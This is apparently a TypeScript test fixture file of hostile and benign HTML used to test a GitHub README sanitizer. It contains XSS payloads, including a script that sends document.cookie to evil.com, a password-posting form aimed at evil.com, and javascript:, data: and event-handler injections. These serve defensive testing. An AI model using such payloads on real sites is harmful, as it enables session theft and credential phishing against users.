/**
 * Hostile + benign HTML fixtures for src/lib/github/sanitize.test.ts.
 * These simulate what a malicious (or merely careless) GitHub-rendered
 * README could contain. Never import this file outside tests.
 */

export const SCRIPT_TAG = `<p>Hello</p><script>document.location='https://evil.com/steal?c='+document.cookie;</script><p>World</p>`;

export const MIXED_CASE_SCRIPT_TAG = `<p>Hello</p><ScRiPt>alert('xss')</ScRiPt><p>World</p>`;

export const IFRAME_TAG = `<p>Before</p><iframe src="https://evil.com/phish" width="600" height="400"></iframe><p>After</p>`;

export const FORM_TAG = `<p>Login</p><form action="https://evil.com/steal" method="post"><input type="password" name="pw" /><button type="submit">Submit</button></form>`;

export const STYLE_TAG = `<style>body { background: url(javascript:alert(1)); } .x { color: red; }</style><p>Styled</p>`;

export const EVENT_HANDLER_ATTRS = `<img src="https://example.com/x.png" alt="x" onerror="alert(1)" /><a href="https://example.com" onclick="alert(2)">link</a><p onload="alert(3)">text</p>`;

export const JAVASCRIPT_URL_HREF = `<a href="javascript:alert('xss')">click me</a>`;

export const JAVASCRIPT_URL_SRC = `<img src="javascript:alert('xss')" alt="bad" />`;

export const DATA_URL_HREF = `<a href="data:text/html,<script>alert(1)</script>">click</a>`;

export const DATA_URL_SRC = `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="bad" />`;

export const CSS_EXPRESSION_ATTEMPT = `<p style="width:expression(alert('xss'))">text</p><table><tr><td style="background:url(javascript:alert(1))">cell</td></tr></table>`;

export const RELATIVE_IMAGE_PATH_DOT_SLASH = `<img src="./assets/screenshot.png" alt="screenshot" />`;

export const RELATIVE_IMAGE_PATH_LEADING_SLASH = `<img src="/assets/screenshot.png" alt="screenshot" />`;

export const RELATIVE_IMAGE_PATH_BARE = `<img src="assets/screenshot.png" alt="screenshot" />`;

export const PROTOCOL_RELATIVE_URLS = `<a href="//evil.com/track">link</a><img src="//cdn.example.com/img.png" alt="x" />`;

export const FRAGMENT_ANCHOR = `<a href="#section-1">Jump to section</a>`;

export const MAILTO_LINK = `<a href="mailto:someone@example.com">Email me</a>`;

/** A benign, realistic README rendering — structure must survive intact. */
export const BENIGN_KITCHEN_SINK = `
<h1>Project Title</h1>
<p>A <strong>great</strong> project with <em>lots</em> of features.</p>
<h2>Installation</h2>
<pre><code>npm install my-package</code></pre>
<h2>Features</h2>
<ul>
  <li>Fast</li>
  <li>Reliable</li>
  <li>Easy to use</li>
</ul>
<h2>Usage</h2>
<blockquote>
  <p>Remember to read the docs first.</p>
</blockquote>
<h2>Comparison</h2>
<table>
  <thead>
    <tr><th>Feature</th><th>Supported</th></tr>
  </thead>
  <tbody>
    <tr><td>TypeScript</td><td>Yes</td></tr>
    <tr><td>ESM</td><td>Yes</td></tr>
  </tbody>
</table>
<p>See the <a href="https://example.com/docs">docs</a> for more, or the local
<a href="./CONTRIBUTING.md">contributing guide</a>.</p>
<img src="./assets/logo.png" alt="Logo" />
<details>
  <summary>Advanced options</summary>
  <p>Here be dragons.</p>
</details>
<p>H<sub>2</sub>O and E=mc<sup>2</sup>, plus <kbd>Ctrl</kbd>+<kbd>C</kbd>.</p>
<hr />
<p>Thanks for reading!<br />— The maintainers</p>
`;

/**
 * Builds an oversized "README" whose byte 200_000 falls in the middle of a
 * filler paragraph, well before a trailing marker string — so if truncation
 * (applied BEFORE parsing) works, the marker can never reach the output.
 */
export function makeOversizedReadme(): string {
  const filler = 'a'.repeat(250_000);
  return `<p>${filler}</p><p>SHOULD_NOT_APPEAR_BEYOND_TRUNCATION</p>`;
}
